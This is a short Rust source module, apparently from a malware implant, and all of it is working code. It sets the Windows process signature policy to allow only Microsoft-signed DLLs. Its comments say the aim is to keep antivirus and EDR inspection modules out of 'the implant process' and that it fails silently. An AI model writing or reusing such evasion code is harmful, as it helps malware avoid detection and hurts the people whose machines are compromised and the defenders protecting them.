// evasion.rs — Block non-Microsoft DLL injection
//
// Applies ProcessSignaturePolicy to the current process so that only
// Microsoft-signed DLLs can be loaded. This prevents AV/EDR products
// from injecting their inspection modules into the implant process.
// Fails silently — the mitigation is applied best-effort.

use windows::Win32::System::SystemServices::{
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY,
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_0,
};
use windows::Win32::System::Threading::{
    ProcessSignaturePolicy, SetProcessMitigationPolicy,
};

pub fn evade() {
    unsafe {
        let _ = block_unsigned_dlls();
    }
}

unsafe fn block_unsigned_dlls() -> windows::core::Result<()> {
    let mut policy = PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY {
        Anonymous: PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_0 { Flags: 0 },
    };
    // Bit 0: MicrosoftSignedOnly
    policy.Anonymous.Flags |= 1;
    SetProcessMitigationPolicy(
        ProcessSignaturePolicy,
        &policy as *const _ as *const _,
        size_of_val(&policy),
    )
}
